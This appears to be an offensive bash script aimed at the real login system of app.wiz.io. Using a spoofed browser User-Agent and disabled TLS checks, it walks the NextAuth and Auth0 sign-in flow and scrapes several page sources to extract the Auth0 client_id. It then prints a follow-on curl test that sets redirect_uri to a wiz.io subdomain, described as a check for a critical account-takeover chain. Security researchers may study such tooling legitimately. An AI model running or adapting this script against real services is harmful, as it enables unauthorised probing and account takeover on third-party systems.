#!/usr/bin/env bash
# wiz-auth0-clientid-extract.sh
# Extracts Auth0 client_id from wiz.io by following the actual OAuth flow.
#
# Primary method: follow the sign-in redirect chain from app.wiz.io/login
# → NextAuth → Auth0 authorize URL → client_id is in the Location header
#
# Run from Pi: bash scripts/wiz-auth0-clientid-extract.sh
set -euo pipefail

OUT="results/wiz.io/chain-tests"
mkdir -p "$OUT"
UA="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"

RED='\033[0;31m'; CYAN='\033[0;36m'; GREEN='\033[0;32m'; NC='\033[0m'
hit()  { echo -e "${RED}[FOUND]${NC} $*"; }
info() { echo -e "${CYAN}[*]${NC} $*"; }
ok()   { echo -e "${GREEN}[CLEAN]${NC} $*"; }

echo ""
echo -e "${CYAN}═══ Wiz Auth0 client_id Extraction (Direct Follow Method) ═══${NC}"
echo ""

# ─── Method 1: Follow /api/auth/signin/auth0 redirect chain ──────────────────
info "Method 1: Follow NextAuth signin redirect (captures client_id from Auth0 authorize URL)"
echo ""

# Step 1: Hit /api/auth/csrf to get NextAuth CSRF token
info "  Getting NextAuth CSRF token..."
CSRF_RESP=$(curl -sk -H "User-Agent: $UA" "https://app.wiz.io/api/auth/csrf" 2>/dev/null)
NEXTAUTH_CSRF=$(echo "$CSRF_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin).get('csrfToken',''))" 2>/dev/null || echo "")
echo "  NextAuth CSRF: ${NEXTAUTH_CSRF:0:20}..."
echo ""

# Step 2: POST to /api/auth/signin/auth0 to trigger the Auth0 redirect
info "  Triggering /api/auth/signin/auth0 (POST)..."
SIGNIN_RESP=$(curl -sk -v --max-redirs 0 \
  -X POST \
  -H "User-Agent: $UA" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Referer: https://app.wiz.io/login" \
  -d "csrfToken=${NEXTAUTH_CSRF}&callbackUrl=https%3A%2F%2Fapp.wiz.io%2Fdashboard" \
  "https://app.wiz.io/api/auth/signin/auth0" 2>&1)
echo "$SIGNIN_RESP" | grep -iE "^[<>*] (HTTP|location|set-cookie)" | head -10
# Extract the redirect URL which should contain client_id
AUTH0_REDIRECT=$(echo "$SIGNIN_RESP" | grep -ioE 'location: https?://[^\r\n]+' | head -1 | awk '{print $2}')
echo "  Redirect URL: $AUTH0_REDIRECT"
echo ""

if [ -n "$AUTH0_REDIRECT" ]; then
  CLIENT_ID=$(echo "$AUTH0_REDIRECT" | grep -oE 'client_id=[A-Za-z0-9_-]+' | cut -d= -f2)
  AUTH_DOMAIN=$(echo "$AUTH0_REDIRECT" | grep -oE 'https?://([^/]+)' | head -1 | sed 's|https://||')
  if [ -n "$CLIENT_ID" ]; then
    hit "client_id FOUND: $CLIENT_ID"
    hit "Auth0 domain: $AUTH_DOMAIN"
    echo "client_id=$CLIENT_ID" >> "$OUT/clientid-found.txt"
    echo "auth_domain=$AUTH_DOMAIN" >> "$OUT/clientid-found.txt"
    echo "redirect_url=$AUTH0_REDIRECT" >> "$OUT/clientid-found.txt"
  fi
fi

# ─── Method 2: GET /api/auth/signin (redirect page, no POST needed) ──────────
info "Method 2: GET /api/auth/signin with provider=auth0 parameter"
echo ""
SIGNIN_GET=$(curl -sk -v --max-redirs 0 \
  -H "User-Agent: $UA" \
  "https://app.wiz.io/api/auth/signin?provider=auth0&callbackUrl=https://app.wiz.io" 2>&1)
echo "$SIGNIN_GET" | grep -iE "^[<>*] (HTTP|location)" | head -5
REDIRECT2=$(echo "$SIGNIN_GET" | grep -ioE 'location: https?://[^\r\n]+' | head -1 | awk '{print $2}')
[ -n "$REDIRECT2" ] && echo "  → $REDIRECT2"
CLIENT_ID2=$(echo "$REDIRECT2" | grep -oE 'client_id=[A-Za-z0-9_-]+' | cut -d= -f2)
[ -n "$CLIENT_ID2" ] && hit "client_id (Method 2): $CLIENT_ID2"
echo ""

# ─── Method 3: /api/auth/providers full response ────────────────────────────
info "Method 3: /api/auth/providers — full response (no head limit)"
echo ""
PROVIDERS=$(curl -sk -H "User-Agent: $UA" "https://app.wiz.io/api/auth/providers" 2>/dev/null)
echo "$PROVIDERS" | python3 -m json.tool 2>/dev/null | tee "$OUT/providers-full.json" | head -60
CLIENT_ID3=$(echo "$PROVIDERS" | python3 -c "
import sys, json, re
try:
    d = json.load(sys.stdin)
    text = json.dumps(d)
    # Look for client_id in nested structure
    matches = re.findall(r'\"clientId\":\s*\"([^\"]+)\"', text)
    for m in matches:
        print(f'clientId: {m}')
    # Auth0 domain
    domains = re.findall(r'\"domain\":\s*\"([^\"]+auth0[^\"]+|[^\"]+wiz\.io[^\"]+)\"', text)
    for d in domains:
        print(f'domain: {d}')
except: pass
" 2>/dev/null || true)
[ -n "$CLIENT_ID3" ] && hit "From /api/auth/providers: $CLIENT_ID3"
echo ""

# ─── Method 4: Fetch homepage and find auth0 config in <script> ──────────────
info "Method 4: Scan app.wiz.io homepage __NEXT_DATA__ for client_id"
echo ""
NEXT_DATA=$(curl -sk -H "User-Agent: $UA" "https://app.wiz.io/" 2>/dev/null \
  | python3 -c "
import sys, re, json
html = sys.stdin.read()
# Extract __NEXT_DATA__ JSON
m = re.search(r'<script id=\"__NEXT_DATA__\"[^>]*>(.*?)</script>', html, re.DOTALL)
if m:
    try:
        d = json.loads(m.group(1))
        text = json.dumps(d)
        # Find any client_id patterns
        ids = re.findall(r'(?:clientId|client_id)[\":\s]+([A-Za-z0-9_\-]{10,})', text)
        for i in ids[:5]:
            print(f'client_id candidate: {i}')
        # Auth0 domains
        doms = re.findall(r'(?:domain|issuer|authority)[\":\s]+(https?://[^\"]+|[a-z0-9.-]+\.(?:auth0|wiz)\.(?:com|io)[^\"]*)', text)
        for d in doms[:3]:
            print(f'domain: {d}')
    except Exception as e:
        print(f'parse error: {e}')
else:
    print('No __NEXT_DATA__ found')
" 2>/dev/null || echo "  parse failed")
echo "$NEXT_DATA"
echo ""

# ─── Method 5: Check the login page directly ─────────────────────────────────
info "Method 5: Check /login page for embedded auth config"
echo ""
LOGIN_PAGE=$(curl -sk -H "User-Agent: $UA" "https://app.wiz.io/login" 2>/dev/null)
echo "$LOGIN_PAGE" | python3 -c "
import sys, re
html = sys.stdin.read()
# Various patterns that embed Auth0 config
patterns = [
    r'client[_-]?[Ii]d[\"\':\s=]+([A-Za-z0-9_\-]{10,50})',
    r'AUTH0_CLIENT_ID[\"\':\s=]+([A-Za-z0-9_\-]{10,50})',
    r'clientID[\"\':\s=]+([A-Za-z0-9_\-]{10,50})',
    r'\"domain\":\s*\"([a-z0-9.-]+\.(?:auth0\.com|wiz\.io))\"',
]
for p in patterns:
    ms = re.findall(p, html)
    for m in ms[:3]:
        print(f'MATCH [{p[:30]}]: {m}')
" 2>/dev/null || true
echo ""

# ─── Method 6: Check the app.wiz.io _next/data/ API route ───────────────────
info "Method 6: Next.js data API /_next/data/ route"
echo ""
# Get the build ID from the page
BUILD_ID=$(curl -sk -H "User-Agent: $UA" "https://app.wiz.io/" 2>/dev/null \
  | grep -oE '"buildId":"[^"]+"' | head -1 | grep -oE '"[A-Za-z0-9_-]+"' | tail -1 | tr -d '"' || echo "")
echo "  Build ID: ${BUILD_ID:-not found}"
if [ -n "$BUILD_ID" ] && [ "$BUILD_ID" != "not found" ]; then
  for ROUTE in "/login" "/index" "/"; do
    EP="/_next/data/$BUILD_ID${ROUTE}.json"
    CODE=$(curl -sk -o /dev/null -w "%{http_code}" -H "User-Agent: $UA" "https://app.wiz.io$EP" 2>/dev/null)
    echo "  $EP → HTTP $CODE"
    if [ "$CODE" = "200" ]; then
      curl -sk -H "User-Agent: $UA" "https://app.wiz.io$EP" 2>/dev/null | head -c 500
    fi
  done
fi
echo ""

# ─── Final summary ───────────────────────────────────────────────────────────
echo -e "${CYAN}═══ Results ═══${NC}"
if [ -s "$OUT/clientid-found.txt" ]; then
  hit "Extracted credentials:"
  cat "$OUT/clientid-found.txt"
  echo ""
  CLIENT_ID_FINAL=$(grep -oE 'client_id=[A-Za-z0-9_-]+' "$OUT/clientid-found.txt" 2>/dev/null | head -1 | cut -d= -f2 || true)
  if [ -n "$CLIENT_ID_FINAL" ]; then
    echo "NEXT STEP — Test OAuth redirect_uri chain:"
    echo "  CLIENT_ID=$CLIENT_ID_FINAL bash scripts/oauth-redirect-test-wiz.sh"
    echo ""
    echo "Quick manual test:"
    echo "  curl -sI --max-redirs 0 \\"
    echo "    'https://auth.wiz.io/authorize?response_type=code&client_id=${CLIENT_ID_FINAL}&redirect_uri=https://win-test.wiz.io/callback&scope=openid+profile&state=poc123' \\"
    echo "    | grep -i 'location:'"
    echo "  HIT → win-test.wiz.io in Location = CRITICAL account takeover chain"
  fi
else
  echo "  client_id not found automatically."
  echo ""
  echo "  MANUAL FALLBACK (guaranteed to work — 30 seconds):"
  echo "  1. Open https://app.wiz.io/login in browser"
  echo "  2. Open DevTools → Network tab"
  echo "  3. Click 'Sign in with SSO' or any auth button"
  echo "  4. Watch for redirect to auth.wiz.io/authorize?"
  echo "  5. Copy the client_id= value from that URL"
  echo "  6. Run: CLIENT_ID=<value> bash scripts/oauth-redirect-test-wiz.sh"
fi
